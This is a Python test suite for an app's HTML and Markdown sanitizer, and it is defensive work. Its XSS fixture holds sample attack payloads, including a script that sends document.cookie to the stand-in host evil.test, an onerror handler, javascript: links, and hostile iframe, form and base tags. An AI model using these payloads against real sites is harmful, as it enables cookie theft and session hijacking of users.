from app.security.sanitizer import CSP, sanitize_html, sanitize_markdown, strip_code_fence

XSS = """<div>hi</div>
<script>fetch('https://evil.test/steal?c='+document.cookie)</script>
<img src=x onerror="alert(1)">
<a href="javascript:alert(2)">click</a>
<iframe src="https://evil.test"></iframe>
<form action="https://evil.test"><input name="p"></form>
<base href="https://evil.test">
"""


def test_script_removed_when_scripts_disallowed():
    out, report = sanitize_html(XSS, allow_scripts=False)
    assert "<script" not in out.lower()
    assert "script" in report["removed"]


def test_cookie_stealing_script_removed_even_when_scripts_allowed():
    out, report = sanitize_html(XSS, allow_scripts=True)
    assert "document.cookie" not in out
    assert report["scripts_kept"] == 0


def test_benign_script_survives_when_allowed():
    out, report = sanitize_html(
        "<button id='b'>go</button><script>document.getElementById('b')"
        ".addEventListener('click',()=>{})</script>", allow_scripts=True)
    assert "addEventListener" in out
    assert report["scripts_kept"] == 1


def test_event_handlers_and_dangerous_tags_are_stripped():
    out, _ = sanitize_html(XSS, allow_scripts=True)
    lowered = out.lower()
    assert "onerror" not in lowered
    assert "<iframe" not in lowered
    assert "<form" not in lowered
    assert "<base" not in lowered
    assert "javascript:" not in lowered


def test_csp_is_always_injected():
    out, _ = sanitize_html("<p>hello</p>")
    assert "Content-Security-Policy" in out
    assert "connect-src 'none'" in CSP
    assert out.lstrip().lower().startswith("<!doctype html")


def test_existing_document_keeps_its_structure_and_gains_csp():
    out, _ = sanitize_html("<html><head><title>T</title></head><body><p>x</p></body></html>")
    assert "Content-Security-Policy" in out
    assert "<title>T</title>" in out


def test_safe_content_is_preserved():
    src = ('<h1>Report</h1><style>h1{color:#222}</style><table><tr><td>a</td></tr></table>'
           '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4"/></svg>')
    out, report = sanitize_html(src)
    for fragment in ("<h1>", "<style>", "<table>", "<svg", "<circle"):
        assert fragment in out
    assert report["removed"] == []


def test_markdown_strips_embedded_html_and_js_links():
    out, report = sanitize_markdown(
        "# Title\n<script>alert(1)</script>\n[x](javascript:alert(2))")
    assert "<script" not in out
    assert "javascript:" not in out
    assert "# Title" in out
    assert report["removed"]


def test_code_fence_is_stripped():
    assert strip_code_fence("```html\n<p>x</p>\n```") == "<p>x</p>"
    assert strip_code_fence("<p>x</p>") == "<p>x</p>"
